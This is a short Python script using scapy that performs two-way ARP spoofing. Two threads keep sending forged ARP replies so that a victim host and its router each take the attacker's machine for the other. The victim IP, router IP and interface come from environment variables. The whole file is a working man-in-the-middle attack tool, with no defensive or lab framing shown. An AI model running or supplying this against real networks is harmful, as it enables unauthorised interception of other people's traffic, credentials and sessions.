from scapy.all import getmacbyip, Ether, ARP, sendp
import time
import threading


from dotenv import load_dotenv
import os
load_dotenv()
victim_ip = os.getenv("victim_ip")
router_ip = os.getenv("router_ip")
iface = os.getenv("iface")


def arp_spoof(target_ip, spoof_ip, interface="eth0"):
	target_mac = getmacbyip(target_ip)
	if not target_mac:
		print(f"[!] Could not resolve MAC for {target_ip}.")
		return

	arp_packet = (
		Ether(dst=target_mac) /
		ARP(pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, op='is-at')
	)
	print(f"[+] Spoofing: {spoof_ip} is-at me --> {target_ip}: started")
	while True:
		sendp(arp_packet, verbose=False, iface=interface)
		#print(f"[+] Spoofing: {spoof_ip} is-at me --> {target_ip}")
		time.sleep(2)

def main():

	t1 = threading.Thread(target=arp_spoof, args=(victim_ip, router_ip, iface))
	t2 = threading.Thread(target=arp_spoof, args=(router_ip, victim_ip, iface))
	t1.start()
	t2.start()

	try:
		while True:
			time.sleep(1)
	except KeyboardInterrupt:
		print("\n[!] Stopping ARP spoofing...")

if __name__ == "__main__":
	main()

